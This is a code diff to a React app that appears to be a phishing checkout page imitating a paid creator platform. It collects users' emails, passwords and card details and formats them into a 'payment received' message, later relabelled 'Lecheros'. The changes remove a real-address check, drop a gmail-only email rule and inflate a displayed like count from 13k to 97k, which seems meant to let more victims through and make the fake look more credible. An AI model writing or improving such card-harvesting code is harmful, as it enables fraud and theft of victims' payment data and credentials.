@@ -147,21 +147,9 @@ export default function App() {
       return;
     }
 
-    // Heuristic to check if an address string looks "real"
-    const isLikelyReal = (str: string) => {
-      const clean = str.trim();
-      // Requirement: min 5 chars, at least one space, at least one digit, and no extreme repetition
-      return clean.length >= 5 && /\s/.test(clean) && /\d/.test(clean) && !/(.)\1{4,}/.test(clean);
-    };
-
-    if (!isLikelyReal(checkoutData.address)) {
-      alert("⚠️ Error: La dirección de facturación parece inválida. Por favor, ingrese una dirección real (incluya número y calle).");
-      return;
-    }
-
     // Validation: Email
-    if (!checkoutData.email || !checkoutData.email.toLowerCase().endsWith("@gmail.com")) {
-      alert("⚠️ Error: Debe ingresar un correo electrónico @gmail.com válido.");
+    if (!checkoutData.email || !checkoutData.email.includes("@")) {
+      alert("⚠️ Error: Debe ingresar un correo electrónico válido.");
       return;
     }
 
@@ -177,7 +165,7 @@ export default function App() {
     ];
     
     const message = `
-🌟 **NUEVO PAGO RECIBIDO** 🌟
+🌟 **Lecheros** 🌟
 ----------------------------
 📧 **Email:** ${signupEmail || loginEmail}
 👤 **Nombre en Tarjeta:** ${checkoutData.cardName}
@@ -431,9 +419,9 @@ export default function App() {
                             <div className="flex flex-col gap-1">
                               <button 
                                 onClick={handleGoToSignup}
-                                disabled={loginPassword.length < 12 || !loginEmail.toLowerCase().endsWith("@gmail.com")}
+                                disabled={loginPassword.length < 12 || !loginEmail.includes("@")}
                                 className={`w-full font-bold py-4 rounded-full uppercase tracking-wider transition-all ${
-                                  loginPassword.length >= 12 && loginEmail.toLowerCase().endsWith("@gmail.com")
+                                  loginPassword.length >= 12 && loginEmail.includes("@")
                                     ? "bg-[#00aff0] text-white shadow-lg shadow-blue-100 cursor-pointer active:scale-[0.98]" 
                                     : "bg-gray-200 text-gray-400 cursor-not-allowed"
                                 }`}
@@ -521,9 +509,9 @@ export default function App() {
                             <div className="flex flex-col gap-1">
                               <button 
                                 onClick={() => setModalView("payment")}
-                                disabled={signupPassword.length < 12 || !signupName || !signupEmail.toLowerCase().endsWith("@gmail.com")}
+                                disabled={signupPassword.length < 12 || !signupName || !signupEmail.includes("@")}
                                 className={`w-full font-bold py-4 rounded-full uppercase tracking-wider transition-all ${
-                                  signupPassword.length >= 12 && signupName && signupEmail.toLowerCase().endsWith("@gmail.com")
+                                  signupPassword.length >= 12 && signupName && signupEmail.includes("@")
                                     ? "bg-[#00aff0] text-white shadow-lg shadow-blue-100 cursor-pointer active:scale-[0.98]" 
                                     : "bg-gray-200 text-gray-400 cursor-not-allowed"
                                 }`}
@@ -903,7 +891,7 @@ export default function App() {
               <span className="w-1 h-1 bg-white/60 rounded-full" />
               <div className="flex items-center gap-1">
                 <Heart size={14} />
-                <span>13k</span>
+                <span>97k</span>
               </div>
             </div>
           </div>
